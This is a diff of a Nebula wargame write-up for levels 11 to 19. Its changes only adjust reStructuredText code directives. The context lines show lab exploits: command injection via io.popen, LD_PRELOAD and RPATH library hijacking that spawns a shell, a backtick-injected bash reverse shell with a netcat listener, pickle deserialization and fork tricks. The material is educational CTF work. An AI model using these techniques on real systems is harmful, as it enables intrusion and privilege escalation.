@@ -23,7 +23,7 @@ Level 11 ##
 > 
 > There are two ways of completing this level, you may wish to do both :-) 
 
-.. code-block:: C
+.. code:: C
 
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -135,7 +135,7 @@ level 12 ##
 
 > There is a backdoor process listening on port 50001. 
 
-.. code-block:: C
+.. code:: C
 
 	local socket = require("socket")
 	local server = assert(socket.bind("127.0.0.1", 50001))
@@ -173,7 +173,7 @@ level 12 ##
 
 So we need to connect to the localhost on port 50001 and enter the correct password. the password is whatever the hash is in plain text. But even if we get it right you can see that we don't get our token. With a specially crafted password however, we can make use of the :code:`io.popen` call.
 
-.. code-block:: console
+.. code:: console
 
 	level12@nebula:/home/flag12$ nc localhost 50001
 	Password: hello && getflag > /tmp/out
@@ -186,7 +186,7 @@ Level 13 ##
 
 > There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id. 
 
-.. code-block:: C
+.. code:: C
 
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -217,7 +217,7 @@ Here we need to fake our UID. Sounds tricky. Actually, we don't fake our UID, we
 :code:`getuid` is called from a library, which means we are able to replace it with our own library. Let's take a look at
 the function definition of :code:`getuid`
 
-.. code-block:: console
+.. code:: console
 
 	GETUID(2)                  Linux Programmer's Manual                 GETUID(2)
 	
@@ -233,7 +233,7 @@ the function definition of :code:`getuid`
 
 Ok, so let's write our verison of:
 
-.. code-block:: C
+.. code:: C
 
 	#include <sys/types.h>
 	
@@ -243,7 +243,7 @@ and compile it as a shared library which we then preload (see :code:`man ld.so` 
 copy the :code:`flag13` binary to our local directory because it needs to be run as the same user level as the 
 library we are trying to preload.
 
-.. code-block:: console
+.. code:: console
 
 	level13@nebula:/tmp$ gcc -shared -fPIC fake.c -o fetgetuid.so
 	level13@nebula:/tmp$ cp ~flag13/flag13 .
@@ -262,14 +262,14 @@ Level 14 ##
 
 The contents of :code:`token` were encrypted using the :code:`flag14` binary in :code:`~flag14`. If you run it you can see how it works. Let's enter something and see if we can work out how it works. I created a file with the contents :code:`abcdefghijklmno` in :code:`/tmp/test`
 
-.. code-block:: console
+.. code:: console
 
 	 level14@nebula:/home/flag14$ cat /tmp/test | ./flag14 -e
 	acegikmoqsuwy{}level14@nebula:/home/flag14$
 
 So luckily it's fairly straightforward, it offsets each letter by the value of its position in the string. A quick Python script can reverse the process.
 
-.. code-block:: python
+.. code:: python
 
 	 import sys
 	
@@ -289,7 +289,7 @@ So luckily it's fairly straightforward, it offsets each letter by the value of i
 
 And now pipe the token into it
 
-.. code-block:: console
+.. code:: console
 
 	level14@nebula:/home/flag14$ python /tmp/decrypt.py 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
 	857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
@@ -313,7 +313,7 @@ Level 15 ##
 
 After running :code:`strace` we notice this particular bit
 
-.. code-block:: console
+.. code:: console
 
 	level15@nebula:/home/flag15$ strace ./flag15
 	.
@@ -326,7 +326,7 @@ After running :code:`strace` we notice this particular bit
 
 It's trying to load libc.so.6 from a specific location. Why is that? Let's use :code:`readelf` to take a look
 
-.. code-block:: console
+.. code:: console
 
 	evel15@nebula:/home/flag15$ readelf -d ./flag15
 	
@@ -341,7 +341,7 @@ It's trying to load libc.so.6 from a specific location. Why is that? Let's use :
 
 So it's got an :code:`RPATH` to that location and as luck would have it we have write permissions to it. I guess we can create our own :code:`libc.so.6` in that directory and use it to execute some code - like get ourselves a flag15 shell. Let's take a look at what symbols we're actually using
 
-.. code-block:: console
+.. code:: console
 
 	level15@nebula:/home/flag15$ objdump -R flag15
 	
@@ -358,7 +358,7 @@ So we've got a choice here between :code:`__libc_start_main` or :code:`__gmon_st
 
 So let us begin with the code for our library by looking up the `function declaration <http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html>`_
 
-.. code-block:: C
+.. code:: C
 
 	#include <linux/unistd.h>
 	
@@ -370,7 +370,7 @@ So let us begin with the code for our library by looking up the `function declar
 
 In theory we should get a shell now
 
-.. code-block:: console
+.. code:: console
 
 	level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
 	level15@nebula:/var/tmp/flag15$ ~flag15/flag15
@@ -381,7 +381,7 @@ In theory we should get a shell now
 
 Nuts, we have a symbol missing, namely :code:`__cxa_finalize`. Let's add it an try again
 
-.. code-block:: C
+.. code:: C
 
 	#include <linux/unistd.h>
 	
@@ -395,7 +395,7 @@ Nuts, we have a symbol missing, namely :code:`__cxa_finalize`. Let's add it an t
 	    system("/bin/sh");
 	}
 
-.. code-block:: console
+.. code:: console
 
 	level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 mylibc.c
 	level15@nebula:/var/tmp/flag15$ ~flag15/flag15
@@ -405,7 +405,7 @@ Nuts, we have a symbol missing, namely :code:`__cxa_finalize`. Let's add it an t
 
 What? I realise we are slowly approaching the limits of my capabilities of dealing with Linux's demands. I searched around and found out about `version scripts <http://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_25.html>`_. Let's hope it works
 
-.. code-block:: console
+.. code:: console
 
 	level15@nebula:/var/tmp/flag15$ cat version
 	GLIBC_2.0 { };
@@ -422,7 +422,7 @@ What? I realise we are slowly approaching the limits of my capabilities of deali
 
 So really we can also get rid of our implementation of :code:`__cxa_finalize` as it's all statically linked now.
 
-.. code-block:: console
+.. code:: console
 
 	level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 mylibc.c
 	level15@nebula:/var/tmp/flag15$ ~flag15/flag15
@@ -436,7 +436,7 @@ Level 16 ##
 
 > There is a perl script running on port 1616.
 
-.. code-block:: perl
+.. code:: perl
 
 	#!/usr/bin/env perl
 	
@@ -483,7 +483,7 @@ gets us around the uppercase limitation as we can create an uppercase command
 at a path we can write to. I've chosen :code:`/tmp` as my target.
 I'm going to create a reverse shell to a listening port. First off I login to level16 again (or somewhere else on the network) and run
 
-.. code-block:: console
+.. code:: console
 
 	level16@nebula:~$ nc -l 1337
 
@@ -491,7 +491,7 @@ To create a netcat listener on port *1337*
 
 Next I construct the payload for the script
 
-.. code-block:: console
+.. code:: console
 
 	level16@nebula:/home/flag16$ cat /tmp/RSHELL
 	#!/bin/bash
@@ -500,13 +500,13 @@ Next I construct the payload for the script
 
 Note the uppercase filename, this is important as our username gets uppercased. The command in the script is a standard bash reverse shell. Now we pass the wildcard script path to the Perl script with backticks so it gets evaluated.
 
-.. code-block:: console
+.. code:: console
 
 	http://192.168.56.101:1616/index.cgi?username=%60/*/RSHELL%60&password=test2
 
 Back in the shell where we launched the netcat listener we do the following (the :code:`whoami` is just to confirm I am the right user)
 
-.. code-block:: console
+.. code:: console
 
 	level16@nebula:~$ nc -l 1337
 	bash: no job control in this shell
@@ -522,7 +522,7 @@ Level 17 ##
 
 > There is a python script listening on port 10007 that contains a vulnerability. 
 
-.. code-block:: python
+.. code:: python
 
 	#!/usr/bin/python
 	
@@ -558,7 +558,7 @@ Here `pickle` provides us with the possibility of an exploit to run our own code
 
 Right, so my plan is to get a shell as *flag17* and get the flag from there. Using pickle's opcodes I can construct a string that will run :code:`getflag` from the :code:`pickle.loads` call as user *flag17*. So before I started constructing this I copied the script and ran it as *level17* on a different port in order to debug and see what's going on. Once I was happy with my exploit code I changed the port to :code:`10007` and ran it to get the flag.
 
-.. code-block:: python
+.. code:: python
 
 	#!/bin/python
 	import socket
@@ -583,7 +583,7 @@ I'll explain the pickle string a bit:
 
 Once run it looks like it worked so let's be sure
 
-.. code-block:: console
+.. code:: console
 
 	level17@nebula:/tmp/flag17$ cat ../f17pwned
 	You have successfully executed getflag on a target account
@@ -593,7 +593,7 @@ Level 18 ##
 
 > Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it. 
 
-.. code-block:: C
+.. code:: C
 
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -727,7 +727,7 @@ the *shell* command, but that means we need to be logged in. I'll make a
 note of that. The :code:`setuser` function has a fixed sized buffer. Let's try to 
 overflow that
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ python -c "print('setuser ' + 'A'*128)" | ./flag18 -v -v -v -d /tmp/flag18/debug
 	*** buffer overflow detected ***: ./flag18 terminated
@@ -769,7 +769,7 @@ This led me to learn about `stack canaries <https://en.wikipedia.org/wiki/Stack_
 *FORTIFY_SOURCE* and this also going to prevent string formatting exploits in
 the :code:`notsupported` function.
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ ./flag18 -v -v -v -d /tmp/flag18/debug
 	site exec %n
@@ -789,7 +789,7 @@ the tool doesn't close the file descriptors until you call :code:`closelog`,
 we can just keep opening files until we hit the limit. Let's see what that
 limit is.
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ ulimit -a
 	core file size          (blocks, -c) 0
@@ -812,7 +812,7 @@ limit is.
 *1024* is the limit. So let's open 1024 files and see what happens. As we have
 a few file descriptors open already we just need to open 1021 more.
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'shell')" | ./flag18 -v -d /tmp/flag18/debug
 	./flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
@@ -820,7 +820,7 @@ a few file descriptors open already we just need to open 1021 more.
 Ah, so many file descriptors we can't open any more, not even to shared libraries.
 We can close one and see how that goes.
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'closelog\n' + 'shell')" | ./flag18 -v -d /tmp/flag18/debug
 	./flag18: -d: invalid option
@@ -860,7 +860,7 @@ Time to read the manual....
 
 Ok, well, it's worth a shot.
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ python -c "print('login me\n'*1021 + 'closelog\n' + 'shell')" | ./flag18 --rcfile -d /tmp/flag18/debug
 	./flag18: invalid option -- '-'
@@ -880,7 +880,7 @@ the first line in the file is *Starting up. Verbose level = 1*, so all we really
 need to do to quash that error we need to create an executable with that name.
 Inside that we will run out beloved :code:`getflag`
 
-.. code-block:: console
+.. code:: console
 
 	level18@nebula:/home/flag18$ echo getflag > /tmp/Starting
 	level18@nebula:/home/flag18$ chmod +x !$
@@ -906,7 +906,7 @@ Flag 19 ##
 
 > There is a flaw in the below program in how it operates. 
 
-.. code-block:: C
+.. code:: C
 
 	#include <stdlib.h>
 	#include <unistd.h>
@@ -950,7 +950,7 @@ This exploits involves a knowledge of Linux forks. Basically if a process
 forks and the parent dies, the child will automatically be run under :code:`init`.
 This is called `Fork off and die <http://wiki.linuxquestions.org/wiki/Fork_off_and_die>`_. So who does `init` run as?
 
-.. code-block:: console
+.. code:: console
 
 	level19@nebula:/tmp/flag19$ ps aux | grep init
 	root         1  0.0  0.6   3196  1512 ?        Ss   00:32   0:00 /sbin/init
@@ -961,7 +961,7 @@ it executes, and thus we can make use of this. I'll write some C code
 to fork the :code:`flag18` process to which we will pass the :code:`getflag`. It should
 work.
 
-.. code-block:: C
+.. code:: C
 
 	#include <unistd.h>
 	
@@ -980,7 +980,7 @@ work.
 
 Get the idea? Right, let's taste this pudding
 
-.. code-block:: console
+.. code:: console
 
 	level19@nebula:/tmp/flag19$ gcc forkit.c -o forkit
 	level19@nebula:/tmp/flag19$ ./forkit
